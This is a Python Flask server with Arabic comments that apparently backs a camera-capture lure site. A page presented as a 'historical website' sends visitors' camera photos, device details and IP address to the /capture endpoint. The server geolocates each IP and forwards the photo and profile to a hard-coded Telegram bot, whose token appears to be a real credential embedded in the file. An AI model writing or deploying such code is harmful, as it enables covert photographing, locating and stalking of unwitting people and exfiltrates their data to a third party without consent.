import os
import base64
import requests
from flask import Flask, request, jsonify, send_from_directory
from telebot import TeleBot
from datetime import datetime

app = Flask(__name__)

# ⚠️ أدخل التوكن و Chat ID الخاصين بك هنا ⚠️
TOKEN = "8877750705:AAHSSXX_VU39r_LwcxvE9tB_xe3cTqL990A"
CHAT_ID = 821436485  # استبدله بالرقم الصحيح الذي حصلت عليه من @userinfobot

bot = TeleBot(TOKEN)

def get_location_from_ip(ip):
    """الحصول على الموقع الجغرافي من IP باستخدام ip-api.com"""
    try:
        # تجاهل الـ IP الخاص (localhost / private)
        if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
            return "محمي (شبكة خاصة)"
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,regionName,lat,lon', timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            city = data.get('city', 'غير معروف')
            region = data.get('regionName', 'غير معروف')
            country = data.get('country', 'غير معروف')
            lat = data.get('lat', '')
            lon = data.get('lon', '')
            if lat and lon:
                return f"{city}, {region}, {country} (📍 {lat}, {lon})"
            else:
                return f"{city}, {region}, {country}"
        return "غير متاح"
    except Exception as e:
        print("خطأ في تحديد الموقع:", e)
        return "غير متاح"

@app.route('/')
def index():
    """الصفحة الرئيسية للموقع التاريخي"""
    return send_from_directory('templates', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            return jsonify({"status": "error", "msg": "No image"}), 400

        # فك الصورة
        img_data = base64.b64decode(data['image'].split(',')[1])

        # الحصول على IP الحقيقي
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()

        # الحصول على الموقع الجغرافي
        location = get_location_from_ip(client_ip)

        # معلومات الجهاز من الجافاسكريبت
        device = data.get('device_info', {})
        os_name = device.get('os', 'غير معروف')
        browser = device.get('browser', 'غير معروف')
        screen = device.get('screen', 'غير معروف')
        language = device.get('language', 'غير معروف')
        camera_type = data.get('camera', 'unknown')  # 'front' أو 'back'

        # بناء رسالة الصورة
        msg = f"<b>📸 صورة من زائر الموقع ({camera_type})</b>\n"
        msg += f"🌐 <b>IP:</b> <code>{client_ip}</code>\n"
        msg += f"📍 <b>الموقع:</b> {location}\n"
        msg += f"💻 <b>الجهاز:</b> {os_name} | {browser}\n"
        msg += f"📱 <b>دقة الشاشة:</b> {screen}\n"
        msg += f"🗣️ <b>اللغة:</b> {language}\n"
        msg += f"🕒 <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        # إرسال الصورة والنص إلى التيليغرام
        bot.send_photo(CHAT_ID, img_data, caption=msg, parse_mode='HTML')
        return jsonify({"status": "sent"})
    except Exception as e:
        print("❌ خطأ في السيرفر:", e)
        return jsonify({"status": "error", "msg": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
